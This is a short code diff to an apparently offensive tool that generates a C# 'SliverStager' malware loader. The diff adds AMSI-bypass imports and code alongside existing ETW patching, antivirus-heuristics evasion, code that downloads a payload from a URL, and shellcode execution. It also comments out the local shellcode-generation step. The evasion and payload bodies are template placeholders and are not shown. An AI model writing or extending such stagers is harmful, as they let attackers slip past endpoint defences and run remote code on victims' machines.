@@ -31,10 +31,12 @@ namespace SliverStager
         {ak.HEURISTICS_IMPORT}
         {ak.ARCH_DETECTION}
         {ak.ETW_FUNCS}
+        {ak.AMSI_BYPASS_IMPORT}
         public static void Main()
         {{
             {ak.HEURISTICS_CODE}
             {ak.ETW_PATCH}
+            {ak.AMSI_BYPASS_CODE}
             {URL_DL_CODE}
             {ak.START_SHELLCODE}
         }}
@@ -66,7 +68,7 @@ def generate_shellcode():
   print("Wrote shellcode to " + filename)
 
 def main():
-  generate_shellcode()
+  #generate_shellcode()
   generate(STAGER_URL)
   compile()
 
